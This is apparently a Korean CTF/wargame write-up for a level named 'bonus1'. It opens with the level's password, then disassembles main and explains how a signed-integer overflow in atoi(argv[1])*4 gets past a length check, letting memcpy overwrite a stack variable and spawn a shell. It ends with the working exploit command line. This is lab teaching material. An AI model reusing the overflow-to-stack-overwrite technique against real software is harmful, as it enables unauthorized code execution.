> Password: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9

main 함수의 어셈블리 코드를 보면

```
08048424 <main>:
 8048424:	55                   	push   %ebp
 8048425:	89 e5                	mov    %esp,%ebp
 8048427:	83 e4 f0             	and    $0xfffffff0,%esp
 804842a:	83 ec 40             	sub    $0x40,%esp
 804842d:	8b 45 0c             	mov    0xc(%ebp),%eax
 8048430:	83 c0 04             	add    $0x4,%eax
 8048433:	8b 00                	mov    (%eax),%eax
 8048435:	89 04 24             	mov    %eax,(%esp)
 8048438:	e8 23 ff ff ff       	call   8048360 <atoi@plt>
 804843d:	89 44 24 3c          	mov    %eax,0x3c(%esp)
 8048441:	83 7c 24 3c 09       	cmpl   $0x9,0x3c(%esp)
 8048446:	7e 07                	jle    804844f <main+0x2b>
 8048448:	b8 01 00 00 00       	mov    $0x1,%eax
 804844d:	eb 54                	jmp    80484a3 <main+0x7f>
 804844f:	8b 44 24 3c          	mov    0x3c(%esp),%eax
 8048453:	8d 0c 85 00 00 00 00 	lea    0x0(,%eax,4),%ecx
 804845a:	8b 45 0c             	mov    0xc(%ebp),%eax
 804845d:	83 c0 08             	add    $0x8,%eax
 8048460:	8b 00                	mov    (%eax),%eax
 8048462:	89 c2                	mov    %eax,%edx
 8048464:	8d 44 24 14          	lea    0x14(%esp),%eax
 8048468:	89 4c 24 08          	mov    %ecx,0x8(%esp)
 804846c:	89 54 24 04          	mov    %edx,0x4(%esp)
 8048470:	89 04 24             	mov    %eax,(%esp)
 8048473:	e8 a8 fe ff ff       	call   8048320 <memcpy@plt>
 8048478:	81 7c 24 3c 46 4c 4f 	cmpl   $0x574f4c46,0x3c(%esp)
 804847f:	57 
 8048480:	75 1c                	jne    804849e <main+0x7a>
 8048482:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
 8048489:	00 
 804848a:	c7 44 24 04 80 85 04 	movl   $0x8048580,0x4(%esp)
 8048491:	08 
 8048492:	c7 04 24 83 85 04 08 	movl   $0x8048583,(%esp)
 8048499:	e8 b2 fe ff ff       	call   8048350 <execl@plt>
 804849e:	b8 00 00 00 00       	mov    $0x0,%eax
 80484a3:	c9                   	leave  
 80484a4:	c3                   	ret
```

argv[1]을 atoi함수로 정수로 바꾼 뒤 그 수에 4를 곱하여 나온 길이 만큼 memcpy를 이용해서 argv[2]문자열을 스택 (0x14(%esp))에 집어넣은 뒤 0x3c(%esp)위치에 WOLF라는 문자열이 들어왔는지 확인하여 쉘을 실행하는 코드이다. 이 때 atoi(argv[1]) * 4의 값이 9보다 클 경우 프로그램이 즉시 종료되게 설계되어 있다.

0x14와 0x3c의 차가 40이므로, 집어넣어야 하는 문자열 WOLF의 길이까지 고려하면 총 44바이트만큼을 복사해야하고, 프로그램애서 * 4를 하는 로직이 있으니 실제로 argv[1] 으로 들어가야 하는 값은 11이다. 하지만 프로그램이 9보다 큰 값을 거부하므로 다른 접근을 생각해봐야 한다.

atoi는 부호 있는 정수를 취급한다는 점을 이용해서, 음수이지만 4를 곱했을 때 오버플로우가 일어나 44가 나오는 수를 argv[1]에 넣으면 문제를 해결할 수 있다.

44를 4로 나눈 값 11에서 부호 비트만을 1로 두면

1000 0000 0000 0000 0000 0000 0000 1011 (-2147483637) 이 되는데

이 값은 음수여서 9보다 작거나 같으면서, 4를 곱했을 때 부호 비트가 오버플로우로 소실되면서 44가 되는 수이다.

```bash
./bonus1 -2147483637 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
```